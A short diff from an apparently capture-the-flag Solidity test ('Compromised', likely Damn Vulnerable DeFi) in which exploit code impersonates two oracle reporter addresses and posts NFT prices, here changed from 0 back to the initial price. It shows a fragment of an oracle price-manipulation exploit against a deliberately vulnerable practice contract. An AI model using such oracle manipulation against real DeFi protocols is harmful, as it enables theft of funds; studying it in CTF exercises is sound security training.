@@ -104,10 +104,10 @@ contract Compromised is DSTest {
         vm.stopPrank();
 
         vm.startPrank("0xe92401A4d3af5E446d93D11EEc806b1462b39D15");
-        trustfulOracle.postPrice("DVNFT", 0);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         vm.stopPrank();
         vm.startPrank("0x81A5D6E50C214044bE44cA0CB057fe119097850c");
-        trustfulOracle.postPrice("DVNFT", 0);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         vm.stopPrank();
 
         /** EXPLOIT END **/
